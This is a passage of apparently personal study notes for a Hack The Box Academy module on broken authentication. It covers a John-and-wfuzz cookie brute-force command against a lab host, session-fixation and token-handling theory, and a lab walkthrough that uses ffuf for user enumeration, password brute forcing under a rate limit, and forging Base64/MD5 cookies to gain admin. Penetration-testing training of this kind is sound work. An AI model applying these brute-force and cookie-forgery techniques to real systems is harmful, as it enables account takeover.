[Wfuzz](https://github.com/xmendez/wfuzz/) can be fed by another program using a classic pipe, and we will use `John` as a feeder. We set `John` in incremental mode, using the built-in "LowerNum" charset that matches our observation (`--incremental=LowerNum`), we specify a password length of 6 chars (`--min-length=6 --max-length=6`), and we also instruct `John` to print the output as stdout (`--stdout`). Then, `wfuzz` uses the payload from stdin (`-z stdin`) and fuzzes the "HTBSESS" cookie (`-b HTBSESS=FUZZ`), looking for the string `"Welcome"` (`--ss "Welcome"`) in server responses for the given URL:
```
user@htb[/htb]$ john --incremental=LowerNum --min-length=6 --max-length=6 --stdout| wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://brokenauthentication.hackthebox.eu/profile.php 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://brokenauth.hackthebox.eu/
Total requests: <<unknown>>

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Created directory: ~/john-the-ripper/297/.john
Press 'q' or Ctrl-C to abort, almost any other key for status
000009897:   200        9 L      31 W     274 Ch      "abaney"
```

This attack could take a long time, and it is infeasible if the token is lengthy. Chances are higher if cookies last longer than a single session, but do not expect a quick win here. We encourage you to practice using a PHP file you can download [here](https://academy.hackthebox.com/storage/modules/80/scripts/bruteforce_cookie_php.txt). Please read the file carefully and try to make it print the congratulations message.

### Exercise

Question 1: Tamper the session cookie for the application at subdirectory /question1/ to give yourself access as a super user. What is the flag?

Solution: the decoded structure of the token is `user:htbuser;role:student;time:1648052408`. We need only to change the `role` field as `super` and we get the flag also without changing the `user` or `time` fields. It means that the authorization rights are given not based on the user account but on the session cookie value.

Question 2: Log in to the target application and tamper the rememberme token to give yourself super user privileges. After escalating privileges, submit the flag as your answer.

Solution: remember to check the "Remember Me" checkbox. The usage of this checkbox will shows in the HTTP response (and then in the second and other HTTP requests) the `HTBPERSISTENT` cookie. Duriing the decode by Cyberchef, use "Magic" block.

## Insecure Token Handling
One difference between cookies and tokens is that cookies are used to send and store arbitrary data, while tokens are explicitly used to send authorization data. When we perform token-based authentication such as OpenID, or OpenID Connect, we receive an `id` token from a trusted authority. This is often referred to as `JSON Web Token` (`JWT`) and token-based authentication.

A typical use case for `JWT` is continuous authentication for `Single Sign-On` (`SSO`). However, `JWT` can be used flexibly for any field where compact, signed, and encrypted information needs to be transmitted. A token should be generated safely but should be handled safely too. Otherwise, all its security could break apart.

### Token Lifetime
A token should expire after the user has been inactive for a given amount of time, for example, after 1 hour, and should expire even if there is activity after a given amount of time, such as 24 hours. If a token never expires, the [Session Fixation](https://owasp.org/www-community/attacks/Session_fixation) attack discussed below is even worse, and an attacker could try to brute force a valid session token created in the past. Of course, the chances of succeeding in a brute force attack are proportionate to the shortness of the cookie value itself.

### Session Fixation
One of the most important rules about a cookie token is that its value should change as soon as the access level changes. This means that a guest user should receive a cookie, and as soon as they authenticate, the token should change. The same should happen if the user gets more grants during a `sudo-like` session. If this does not occur, the web application, or better any authenticated user, could be vulnerable to **Session Fixation**.

This attack is carried out by phishing a user with a link that has a fixed, and, unknown by the web application, session value. The web application should bounce the user to the login page because, as discussed, the `SESSIONID` is not associated with any valid one. When the user logs in, the `SESSIONID` remains the same, and an attacker can reuse it.

A simple example could be a web application that also sets `SESSIONID` from a URL parameter like this:
* `https://brokenauthentication/view.php?SESSIONID=anyrandomvalue`

When a user that does not have a valid session clicks on that link, the web application could set `SESSIONID` as any random value.

Take the below request as an example:
![11-sessionfixation](https://academy.hackthebox.com/storage/modules/80/11-sessionfixation.png)

At line 4 of the server’s response, the `Set-Cookie` header has the value specified at the URL parameter and a redirect to the login page. If the web application does not change that token after a successful login, the phisher/attacker could reuse it anytime until it expires.

### Token in URL
Following the Session Fixation attack, it is worth mentioning another vulnerability named **Token in URL**. Until recent days, it was possible to catch a valid session token by making the user browse away from a website where they had been authenticated, moving to a website controlled by the attacker. The `Referer` header carried the full URL of the previous website, including both the domain and parameters and the webserver would log it.

Nowadays, this attack is not always feasible because, by default, modern browsers strip the `Referer` header. However, it could still be an issue if the web application suffers from a **Local File Inclusion** vulnerability or the [Referer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) header is set in an unsafe manner.

If we can read application or web server logs, we may also obtain a high number of valid tokens remotely. It is also possible to obtain valid tokens remotely if we manage to compromise an external analytics or log collection tool used by a web server or application. You can learn more and practice this attack by studying the [File Inclusion / Directory Traversal module](https://academy.hackthebox.com/course/preview/file-inclusion--directory-traversal).

### Session Security
Secure session handling starts from giving the counterpart, the user, as little information as possible. If a cookie contains only a random sequence, an attacker will have a tough time. On the other side, the web application should hold every detail safely and use a cookie value just as an `id` to fetch the correct session.

Some security libraries offer the feature of transparently encrypting cookie IDs also at the server level. Encryption is performed using some hardcoded values, concatenated to some value taken from the request, such as User-Agent, IP address or a part of it, or another environment variable. An excellent example of this technique has been implemented inside the [Snuffleupagus](https://snuffleupagus.readthedocs.io/cookies.html#cookie-encryption) PHP module. Like any other security measure, cookie encryption is not a silver bullet and could cause unexpected issues.

Session security should also cover multiple logins for the same user and concurrent usage of the same session token from different endpoints. A user should be allowed to have access to an account from one device at a time. An exception can be set for mobile access, which should use a parallel session check. Suppose the web application can identify the endpoint, for example, by using the user agent, screen size and resolution, or other tricks used by trackers. In that case, it should set a sticky session on a given endpoint to raise the overall security level.

### Cookie Security
Most tokens are sent and received using cookies. Therefore, cookie security should always be checked. The cookie should be created with the correct path value, be set as `httponly` and `secure`, and have the proper domain scope. An unsecured cookie could be stolen and reused quite easily through Cross-Site Scripting (XSS) or Man in the Middle (MitM) attacks.

# Skill Assessment

During our penetration test, we come across yet another web application. While the rest of the team keeps scanning the internal network for vulnerabilities in an attempt to gain an initial foothold, you are tasked with examining this web application for authentication vulnerabilities.

Find the vulnerabilities and submit the final flag using the skills we covered in the module sections to complete this module.

From past penetration tests, we know that the `rockyou.txt` wordlist has proven effective for cracking passwords.

Question: Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer.

Solution:

Let's visit the target application. If we visit the **Support** page, we can read a statement saying that is a unique support global account called `support` and also some suggestions about the existance of other accounts related to other departments, divided by country codes.

For first, we should check for the Password Policy. By trying to register new users with random passwords, we note that the Password Policy is:
* start with capital letters
* end with a digit
* at least one lowercase, at least one special char: $ # @ --> the regexp could be: (?=.*[a-z])(?=.*[\$|#|@]) (grep must have -P (perl) option)
* >= 20 characters 

After this, we can register a new account and try to visit the web application. Note that if we try to register accounts that start with `support` or `admin` we get an error because we cannot use these prefix for registration. It could be a tip for other accounts.

Instead, on login page, we see that there is a timeout policy against bruteforce attacks that corresponds to 5 failed attempts and a wait for 30 seconds. For this reason, when we will try to bruteforce later, we can use `-t 1 -p 7` options on `ffuf`. In this way, we send one request each 7 seconds to avoid timeout measure.

By visiting the web application, we can see that the **Messages** section allows us to check if a user exists. Indeed, if we send a message to a non-existent user, we get a message "user not found".

Remember also that, by Burpsuite, we see that there is a session token in `Cookie` parameter that we can manipulate. By decoding it from Base64 -> MD5, reversing it we discover it corresponds to the username. If we try to manipulate it to inject it as `support` user, the web application will redirect us to an error page saying that the user has not grants to visit the web application (by Burpsuite we can stop one step before the redirection to check all the web application).

According to the suggestion on the **Support** page, we can try to get the other accounts of the several departments.

By using `ffuf`, let's try to infer usernames by **Messages** section trying to concatenate `support` with some punctual character and then the country code. At the end of this analysis we find: `support.gr`, `support.it`, `support.us` and `support.cn`.

According to the register form where we cannot use also `admin` string as prefix, we can use `ffuf` with country codes also with this prefix. We get: `admin.gr`, `admin.it`, `admin.us` and `admin.cn`.

According to the Password Policy above, let's generate a wordlist by starting from `rockyou.txt` wordlist. Then, let's use this new wordlist for bruteforcing the support accounts. We should find the related passwords.

Then, keeping Burpsuite intercepting the requests, login as a support account, for example `support.us`. When we access, on Burpsuite let's take the session token of `Cookie` parameter and decode it as Base64->MD5. This time, this MD5 string is different because it is composed of two MD5 strings separated by a `:`, representing "username:role", for example `support.us:support`. At this point, let's try to escalate privileges by encoding the following string `admin.us:admin` to MD5 (each string of those in separated way) and then to Base64. Inject this value to the `Cookie` parameterby Burp Repeater and you will get the flag.
